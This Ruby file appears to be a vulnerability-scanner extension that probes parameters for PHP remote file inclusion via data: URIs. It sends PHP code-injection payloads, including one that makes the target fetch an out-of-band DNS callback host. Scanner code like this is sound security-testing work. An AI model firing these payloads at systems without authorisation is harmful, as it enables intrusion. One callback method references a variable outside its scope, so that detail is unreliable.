module ScannerExtensions
  module Extensions
    class RfiViaDataDetect < BaseExtension
      def initialize
        @type                = :detect
        @general_object_type = :param
        @extension_type      = :vuln
        @detect_type         = [:ptrav, :redir]

        @defaults = {
          timeout: 15,
          sleep:   10
        }
      end

      def oob_callback(object, token)
        array = ScannerExtensions::Helpers::OobDnsClient.get token
        unless array.empty?
          curl = object.curl_helper(value: payload)
          object.vuln(
            extension: 'rfi_via_data',
            template: '/rfi',
            args: {
              exploit_example: curl,
              footers: {
                exploit_example: {
                  view: 'oob_dns',
                  splitter: "\n",
                  params: {
                    hosts: array
                  }
                }
              }
            }
          )
          return object
        end
        return nil
      end

      def run(object, params)
        params = @defaults.merge(params)

        base  = 1231235878 + rand(1000)
        delta = 1 + rand(1000)

        echo_payload = "data:,<?php echo #{base}-#{delta};"
        resp = object.http(
          value:        echo_payload,
          timeout:      params[:timeout],
          open_timeout: params[:open_timeout]
        )

        # check for echo payload
        if resp && resp.body && resp.body.normalize_enconding.index((base - delta).to_s)
          curl = object.curl_helper(
            value: echo_payload,
            resp:  "...\n#{base - delta}\n..."
          )

          object.vuln(
            extension: 'rfi_via_data',
            template:  '/rfi',
            args: {
              exploit_example: curl
            }
          )

          return
        end

        # check with oob-dns payload
        token = ScannerExtensions::Helpers::OobDnsClient.create

        payload = "data:,<?php file_get_contents(\'http://#{token}');"

        object.http(
          value:        payload,
          timeout:      params[:timeout],
          open_timeout: params[:open_timeout]
        )

        if object.oob_callbacks
          object.oob_callbacks << Proc.new do
            oob_callback(object, token)
          end
        else
          sleep params[:sleep]
          oob_callback(object, token)
        end
      end
    end
  end
end
